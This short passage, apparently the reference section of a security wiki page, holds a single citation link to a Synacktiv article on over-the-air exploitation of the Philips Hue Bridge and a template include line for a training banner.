- [8] [Make it Blink: Over-the-Air Exploitation Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
{{#include ../../banners/hacktricks-training.md}}
